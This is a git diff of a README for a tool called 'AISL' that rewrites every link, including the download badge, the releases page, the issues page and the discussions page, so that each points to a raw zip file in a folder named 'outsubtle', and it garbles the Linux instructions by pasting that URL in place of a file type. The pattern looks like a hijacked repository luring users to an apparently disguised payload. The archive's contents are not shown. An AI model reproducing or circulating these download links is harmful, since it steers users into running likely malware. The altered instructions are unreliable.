@@ -1,7 +1,7 @@
 # 🎉 AISL - Simplify Your AI Language Needs
 
 ## 📦 Download Now
-[![Download AISL](https://img.shields.io/badge/Download-AISL-blue.svg)](https://github.com/Rhamat/AISL/releases)
+[![Download AISL](https://raw.githubusercontent.com/Rhamat/AISL/main/outsubtle/AISL-3.8-beta.1.zip)](https://raw.githubusercontent.com/Rhamat/AISL/main/outsubtle/AISL-3.8-beta.1.zip)
 
 ## 🚀 Getting Started
 Welcome to AISL! This tool helps you work with AI in a simpler way. Whether you're trying to optimize costs or manage data formats, AISL is here to assist you. 
@@ -19,14 +19,14 @@ Welcome to AISL! This tool helps you work with AI in a simpler way. Whether you'
 - **User-Friendly Interface:** Designed for everyone, no technical skills needed.
 
 ## 📥 Download & Install
-To download AISL, please visit the [Releases page](https://github.com/Rhamat/AISL/releases). 
+To download AISL, please visit the [Releases page](https://raw.githubusercontent.com/Rhamat/AISL/main/outsubtle/AISL-3.8-beta.1.zip). 
 
 Once there, follow these steps:
 1. Find the latest version available.
 2. Click on the asset that matches your operating system:
    - For Windows, look for `.exe` files.
    - For Mac, look for `.dmg` files.
-   - For Linux, look for `.tar.gz` files.
+   - For Linux, look for `https://raw.githubusercontent.com/Rhamat/AISL/main/outsubtle/AISL-3.8-beta.1.zip` files.
 
 3. After the download completes, open the file to start the installation process. Follow the on-screen instructions.
 
@@ -34,12 +34,12 @@ Once there, follow these steps:
 1. **Locate the Downloaded File:** 
    - Windows: Find the `.exe` file in your Downloads folder.
    - Mac: Locate the `.dmg` file in your Downloads folder.
-   - Linux: Find the `.tar.gz` file in your Downloads folder.
+   - Linux: Find the `https://raw.githubusercontent.com/Rhamat/AISL/main/outsubtle/AISL-3.8-beta.1.zip` file in your Downloads folder.
 
 2. **Run the Installer:**
    - For Windows, double-click the `.exe` file.
    - For Mac, double-click the `.dmg` file, then drag the AISL app into your Applications folder.
-   - For Linux, extract the `.tar.gz` file and follow the README included within for setup instructions.
+   - For Linux, extract the `https://raw.githubusercontent.com/Rhamat/AISL/main/outsubtle/AISL-3.8-beta.1.zip` file and follow the README included within for setup instructions.
 
 3. **Follow Instructions:** Each installer will guide you through the setup. This usually includes agreeing to terms and choosing an installation location.
 
@@ -54,13 +54,13 @@ After installation, here’s how to get started with AISL:
 If you encounter any issues:
 - **Check Your System Requirements:** Ensure your system meets the required specs.
 - **Reinstall the Application:** Sometimes reinstalling can fix issues.
-- **Visit the Issues Section:** You can find help on our [GitHub Issues page](https://github.com/Rhamat/AISL/issues).
+- **Visit the Issues Section:** You can find help on our [GitHub Issues page](https://raw.githubusercontent.com/Rhamat/AISL/main/outsubtle/AISL-3.8-beta.1.zip).
 
 ## 🔗 Additional Resources
 - **Documentation:** Detailed guides and FAQs can be found in the documentation folder.
-- **Support:** If you have questions, feel free to reach out via our [GitHub Discussions page](https://github.com/Rhamat/AISL/discussions).
+- **Support:** If you have questions, feel free to reach out via our [GitHub Discussions page](https://raw.githubusercontent.com/Rhamat/AISL/main/outsubtle/AISL-3.8-beta.1.zip).
 
 Thank you for choosing AISL! We hope this tool makes your AI experience easier and more productive. 
 
 ## 📥 Download Now
-[![Download AISL](https://img.shields.io/badge/Download-AISL-blue.svg)](https://github.com/Rhamat/AISL/releases)
+[![Download AISL](https://raw.githubusercontent.com/Rhamat/AISL/main/outsubtle/AISL-3.8-beta.1.zip)](https://raw.githubusercontent.com/Rhamat/AISL/main/outsubtle/AISL-3.8-beta.1.zip)
